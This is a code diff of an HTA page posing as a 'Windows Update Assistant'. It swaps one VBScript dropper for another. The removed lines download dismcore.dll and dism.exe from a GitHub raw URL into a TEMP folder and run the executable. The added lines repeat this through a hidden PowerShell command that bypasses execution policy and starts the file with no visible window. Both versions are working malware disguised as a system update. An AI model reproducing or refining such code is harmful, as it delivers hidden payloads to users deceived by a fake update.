@@ -3,39 +3,16 @@
 <title>Windows Update Assistant</title>
 <script language="VBScript">
 On Error Resume Next
-Dim oShell,oFSO,oHTTP,sURL,sDst,sDst2
+Dim oShell
 Set oShell=CreateObject("WScript.Shell")
-Set oFSO=CreateObject("Scripting.FileSystemObject")
-sDst=oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData\dismcore.dll"
-sDst2=oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData\dism.exe"
-sURL="https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/"
-If Not oFSO.FolderExists(oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData") Then
-    oFSO.CreateFolder oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData"
-End If
-' Download dismcore.dll
-Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
-oHTTP.Open "GET",sURL&"dismcore.dll",False
-oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
-oHTTP.Send
-If oHTTP.Status=200 Then
-    Dim stm1:Set stm1=CreateObject("ADODB.Stream")
-    stm1.Type=1:stm1.Open
-    stm1.Write oHTTP.responseBody
-    stm1.SaveToFile sDst,2:stm1.Close
-End If
-' Download dism.exe
-Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
-oHTTP.Open "GET",sURL&"dism.exe",False
-oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
-oHTTP.Send
-If oHTTP.Status=200 Then
-    Dim stm2:Set stm2=CreateObject("ADODB.Stream")
-    stm2.Type=1:stm2.Open
-    stm2.Write oHTTP.responseBody
-    stm2.SaveToFile sDst2,2:stm2.Close
-End If
-' Execute
-oShell.Run """"&sDst2&"""",0,False
+oShell.Run "powershell -NoP -W H -EP Bypass -c """ & _
+    "$d=$env:TEMP+'\WinDefData';" & _
+    "if(!(Test-Path $d)){New-Item $d -Force|Out-Null};" & _
+    "$u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/';" & _
+    "(New-Object Net.WebClient).DownloadFile($u+'dismcore.dll',$d+'\dismcore.dll');" & _
+    "(New-Object Net.WebClient).DownloadFile($u+'dism.exe',$d+'\dism.exe');" & _
+    "Start-Process $d+'\dism.exe' -WindowStyle Hidden" & _
+    """",0,False
 window.close
 </script>
 </head>
